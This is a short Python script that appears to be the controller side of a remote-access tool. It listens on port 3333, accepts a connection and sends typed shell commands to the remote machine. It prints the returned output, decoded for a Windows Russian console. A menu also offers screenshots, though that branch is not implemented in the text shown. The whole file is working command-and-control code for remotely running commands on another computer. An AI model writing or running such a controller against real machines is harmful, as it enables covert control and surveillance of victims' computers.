import socket, pickle,struct,imutils, sys
from PIL import Image
import struct
import numpy
import cv2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''
port = 3333
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print(addr)

while True:
    a = input('/cmd - Сommand line\n/screen - ScreenShot\n > ')
    conn.send(a.encode())
    if a == '/cmd':
        cmd = input('#> ')
        conn.send(cmd.encode())
        cmd_process = conn.recv(5000)
        cmd_process = str(cmd_process, "cp866")
        print(cmd_process)
